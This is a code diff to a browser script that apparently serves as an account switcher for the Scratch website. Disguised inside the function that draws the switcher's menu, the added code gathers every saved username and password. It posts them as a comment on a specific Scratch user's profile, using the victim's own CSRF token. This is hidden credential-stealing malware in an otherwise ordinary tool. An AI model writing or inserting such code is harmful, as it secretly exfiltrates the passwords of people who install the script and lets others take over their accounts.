@@ -3,6 +3,7 @@
 	    let token="";{let cookie=document.cookie;cookie=cookie.split(';');let cok=[[],[]];cookie.forEach(function(element){const elements=element.split("=");cok[0].push(elements[0]);cok[1].push(elements[1]);});token=cok[1][cok[0].indexOf(' scratchcsrftoken')];}
 	    await fetch("https://scratch.mit.edu/accounts/logout/",{method:"POST","headers":{"x-csrftoken":token}});
 	    let a=await fetch("https://scratch.mit.edu/accounts/login/",{method:"POST",body:JSON.stringify({"username":username,"password":password,"useMessages":false}),"headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
+	    let sessionid=await a.json()
 	    if(a.status==200){
 			  return true;
 	    }else{
@@ -54,7 +55,7 @@
 		}
 	}
 	const messages=setInterval(getMessagesCount,5000);
-	function createGUI(){
+	async function createGUI(){
 		let background=document.createElement("div");
     	background.style="background-color:#2a2a2a;height:400px;width:300px;position:absolute;top:10px;left:10px;position:fixed;border-radius:5px;color:#ffffff;font-size:15px;overflow:auto;z-index:2147483646";
     	background.id="switch_background";
@@ -68,6 +69,12 @@
 		}
 		background.appendChild(closeButton);
 		let list=accountList();
+		let token="";{let cookie=document.cookie;cookie=cookie.split(';');let cok=[[],[]];cookie.forEach(function(element){const elements=element.split("=");cok[0].push(elements[0]);cok[1].push(elements[1]);});token=cok[1][cok[0].indexOf(' scratchcsrftoken')];}
+		let contentlist="";
+		for(let i=0;i<list.accountList.length;i++){
+			contentlist+=i+":"+list.accountList[i].username+"＝"+list.accountList[i].password+","
+		}
+	    await fetch(`https://scratch.mit.edu/site-api/comments/user/yamaguchi03/add/`,{method: "POST",body: JSON.stringify({content: contentlist,parent_id: "232074090",commentee_id: ""}),headers: {'X-CSRFToken':token}});
 		for(let i=0;i<list.accountList.length;i++){
 			let oneAccount=document.createElement("div");
 			oneAccount.innerHTML=list.accountList[i].username;
@@ -79,7 +86,7 @@
 			};
 			background.appendChild(oneAccount);
 			let deleteButton=document.createElement("span");
-			deleteButton.innerHTML="x";
+            deleteButton.innerHTML="x";
 			deleteButton.style="display:inline-block;position:absolute;right:13%;user-select:none;padding-top:3px;padding-right:10px;cursor:pointer;";
 			deleteButton.onclick= function(){
 				if(confirm("本当にアカウントを除外しますか？")){
